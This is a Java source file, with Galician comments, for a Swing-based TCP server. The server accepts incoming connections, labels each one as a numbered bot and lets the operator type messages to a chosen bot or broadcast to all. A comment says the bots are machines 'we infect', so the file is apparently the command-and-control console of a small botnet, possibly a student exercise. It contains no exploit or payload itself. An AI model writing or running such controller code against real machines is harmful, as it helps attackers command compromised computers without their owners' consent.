import java.awt.FlowLayout;
import java.awt.event.*;
import java.io.*;
import java.net.*;
import java.util.*;
import javax.swing.*;

public class ThreadTCP extends JFrame implements Runnable {
	public ServerSocket serverSocket = null;
	public Socket clientSocket;
	public int conexPort;
	private informacion infobotnet=new informacion();
	public ThreadTCP(int conexPort) {
		this.conexPort = conexPort;
	}

	@Override
	public void run() {
		JTextField cuadraotexto = new JTextField(20); // Creamos un cuadrado de texto
		JComboBox<String> ids = new JComboBox<String>(); // Creamos o desplegable de a quen queremos dirixirnos
		cuadrao ventanita = new cuadrao(); // Creamos unha ventana para meter nela o cuadrado
		ids.addItem("1234Broadcast:");

		ventanita.add(ids);
		ventanita.setLayout(new FlowLayout()); // PARA PODER TER MAIS DE UN JFRAME A VEZ
		cuadraotexto.setBounds(350, 100, 500, 30); // Posicion e tamanho do cuadrado na ventana
		ventanita.add(cuadraotexto); // Engadimos o cuadrado a ventana
		ventanita.setVisible(true);

		ids.addActionListener(new ActionListener() { // declaras o envento do jcombo

			@Override
			public void actionPerformed(ActionEvent e) {
				// TODO Auto-generated method stub
				cuadraotexto.setText(ids.getSelectedItem().toString()); // que imprima no jtext o elemento que elixes
			}
		});

		try {
			serverSocket = new ServerSocket(conexPort);
			System.out.println("\n\t\t\t\tServidor activo:\n");
		} catch (IOException e) {
			e.getMessage();
			System.exit(0);
		}

		int contador = 1;
		while (true) {
			try {
				clientSocket = serverSocket.accept();
			} catch (Exception e) {
				System.out.println("Error na conexion");
				System.exit(0);
			}

			NuevoClienteTCP nuevoClienteTCP = new NuevoClienteTCP(clientSocket, contador,infobotnet);
			cuadraotexto.addActionListener(nuevoClienteTCP);
			Thread aux = new Thread(nuevoClienteTCP);
			ids.addItem("1234Bot" + contador + ":"); // Imos engadindo os bots que infectamos na lista para poder falarlles
			aux.start();
			contador++;
		}
	}
}
